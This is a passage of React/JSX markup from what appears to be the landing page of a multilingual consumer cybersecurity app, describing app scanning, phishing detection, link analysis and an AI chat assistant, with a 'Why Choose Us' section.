                      <div className="p-3 bg-amber-500/20 text-amber-300 rounded-2xl border border-amber-400/40 shadow-lg">
                        <Bot className="w-7 h-7" />
                      </div>
                      <div>
                        <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-amber-300 bg-amber-500/15 px-2 py-0.5 rounded border border-amber-400/30">
                          AI ANALYST
                        </span>
                        <h3 className="text-xl sm:text-2xl font-black text-white mt-1">
                          AI CyberBot Co-Pilot
                        </h3>
                      </div>
                    </div>
                    <p className="text-xs sm:text-sm text-white/70 leading-relaxed">
                      24/7 interactive security conversationalist. Ask deep remediation questions, decode complex permissions, and receive advice in 5 Indian languages.
                    </p>
                    <div className="pt-1">
                      {onOpenChat && (
                        <Button size="sm" glow onClick={onOpenChat} className="text-xs">
                          Open CyberBot Chat
                          <ArrowRight className="ml-1.5 w-4 h-4" />
                        </Button>
                      )}
                    </div>
                  </div>

                  <div className="flex-1 min-w-0 bg-black/50 p-4 sm:p-5 rounded-2xl border border-white/10 space-y-3">
                    <span className="text-xs font-bold text-white/70 uppercase tracking-wider font-mono">
                      Conversational Capabilities
                    </span>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                      <div className="p-3 rounded-xl bg-white/5 border border-white/5">
                        <h4 className="font-bold text-white mb-1">Instant Containment Triage</h4>
                        <p className="text-white/50 text-[11px]">Guides step-by-step SIM blocking, card freezing, and device quarantines.</p>
                      </div>
                      <div className="p-3 rounded-xl bg-white/5 border border-white/5">
                        <h4 className="font-bold text-white mb-1">Multilingual Explainability</h4>
                        <p className="text-white/50 text-[11px]">Explains threat mechanics natively in English, Hindi, Kannada, Tamil, and Telugu.</p>
                      </div>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Horizontal Feature Cards Strip */}
          <div className="space-y-3 pt-2">
            <div className="flex items-center justify-between text-xs text-white/50 font-mono">
              <span>All Security Capabilities at a Glance:</span>
              <span className="text-accent-teal">Select any feature above to view interactive horizontal workflow</span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
              <Card 
                delay={0.1} 
                onClick={() => setSelectedFeature('app')}
                className={`flex flex-row items-start gap-4 p-4 text-left group transition-all cursor-pointer ${
                  selectedFeature === 'app' ? 'border-accent-teal/60 bg-accent-teal/10 shadow-lg' : 'hover:border-accent-teal/30'
                }`}
              >
                <div className="p-2.5 bg-accent-teal/10 rounded-xl shrink-0 group-hover:scale-105 transition-transform">
                  <Search className="w-5 h-5 text-accent-teal" />
                </div>
                <div className="min-w-0">
                  <div className="flex items-center justify-between mb-0.5">
                    <h3 className="text-sm font-bold text-white truncate">{t.appScan}</h3>
                    <span className="text-[9px] font-mono text-accent-teal">01</span>
                  </div>
                  <p className="text-white/50 text-xs leading-relaxed line-clamp-2">
                    Decompile APKs, EXEs & DMGs to uncover hidden spyware & permissions.
                  </p>
                </div>
              </Card>

              <Card 
                delay={0.2} 
                onClick={() => setSelectedFeature('sentinel')}
                className={`flex flex-row items-start gap-4 p-4 text-left group transition-all cursor-pointer ${
                  selectedFeature === 'sentinel' ? 'border-accent-red/60 bg-accent-red/10 shadow-lg' : 'hover:border-accent-red/30'
                }`}
              >
                <div className="p-2.5 bg-accent-red/10 rounded-xl shrink-0 group-hover:scale-105 transition-transform">
                  <BellRing className="w-5 h-5 text-accent-red" />
                </div>
                <div className="min-w-0">
                  <div className="flex items-center justify-between mb-0.5">
                    <h3 className="text-sm font-bold text-white truncate">Scam Sentinel</h3>
                    <span className="text-[9px] font-mono text-accent-red">02</span>
                  </div>
                  <p className="text-white/50 text-xs leading-relaxed line-clamp-2">
                    Real-time WhatsApp & SMS phishing detection with instant audio warning siren.
                  </p>
                </div>
              </Card>

              <Card 
                delay={0.3} 
                onClick={() => setSelectedFeature('link')}
                className={`flex flex-row items-start gap-4 p-4 text-left group transition-all cursor-pointer ${
                  selectedFeature === 'link' ? 'border-purple-400/60 bg-purple-500/10 shadow-lg' : 'hover:border-purple-400/30'
                }`}
              >
                <div className="p-2.5 bg-purple-500/10 rounded-xl shrink-0 group-hover:scale-105 transition-transform">
                  <LinkIcon className="w-5 h-5 text-purple-400" />
                </div>
                <div className="min-w-0">
                  <div className="flex items-center justify-between mb-0.5">
                    <h3 className="text-sm font-bold text-white truncate">{t.linkScan}</h3>
                    <span className="text-[9px] font-mono text-purple-400">03</span>
                  </div>
                  <p className="text-white/50 text-xs leading-relaxed line-clamp-2">
                    Analyze URLs against fake login clones, drive-by malware & zero-day links.
                  </p>
                </div>
              </Card>

              <Card 
                delay={0.4} 
                onClick={() => {
                  setSelectedFeature('bot');
                  if (onOpenChat) onOpenChat();
                }}
                className={`flex flex-row items-start gap-4 p-4 text-left group transition-all cursor-pointer ${
                  selectedFeature === 'bot' ? 'border-amber-400/60 bg-amber-500/10 shadow-lg' : 'hover:border-amber-400/30'
                }`}
              >
                <div className="p-2.5 bg-amber-500/10 rounded-xl shrink-0 group-hover:scale-105 transition-transform">
                  <Bot className="w-5 h-5 text-amber-400" />
                </div>
                <div className="min-w-0">
                  <div className="flex items-center justify-between mb-0.5">
                    <h3 className="text-sm font-bold text-amber-300 truncate">AI CyberBot</h3>
                    <span className="text-[9px] font-mono text-amber-400">04</span>
                  </div>
                  <p className="text-white/50 text-xs leading-relaxed line-clamp-2">
                    Conversational multi-turn threat assistance with multilingual incident triage.
                  </p>
                </div>
              </Card>
            </div>
          </div>

        </div>
      </section>

      {/* Why Choose Us Section */}
      <section className="py-24 px-4">
        <div className="max-w-7xl mx-auto">
          <ScrollReveal className="text-center mb-16">
            <h2 className="text-3xl md:text-4xl font-bold mb-4">{t.whyChooseUs}</h2>
            <div className="w-20 h-1 bg-accent-teal mx-auto rounded-full" />
          </ScrollReveal>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-12">
            <ScrollReveal delay={0.1} className="flex gap-6">
              <div className="flex-shrink-0">
                <Shield className="w-10 h-10 text-accent-teal" />
              </div>
              <div>
                <h4 className="text-lg font-bold mb-2">{t.explainableAI}</h4>
                <p className="text-white/50 text-sm">
                  We don't just give a score. We explain exactly why a threat was detected so you can learn and stay safe.
                </p>
              </div>
            </ScrollReveal>

            <ScrollReveal delay={0.2} className="flex gap-6">
              <div className="flex-shrink-0">
                <Globe className="w-10 h-10 text-accent-teal" />
              </div>
              <div>
                <h4 className="text-lg font-bold mb-2">{t.multilingual}</h4>
                <p className="text-white/50 text-sm">
                  Security should be accessible. Our platform supports English and major Indian languages like Hindi, Kannada, Telugu, and Tamil.
                </p>
              </div>
            </ScrollReveal>

            <ScrollReveal delay={0.3} className="flex gap-6">
              <div className="flex-shrink-0">
                <Lock className="w-10 h-10 text-accent-teal" />
              </div>
              <div>
                <h4 className="text-lg font-bold mb-2">{t.privacyFirst}</h4>
                <p className="text-white/50 text-sm">
                  Your data is analyzed in real-time and never stored. We prioritize your privacy above all else.
                </p>
              </div>
            </ScrollReveal>
          </div>
        </div>
      </section>
    </div>
  );
};
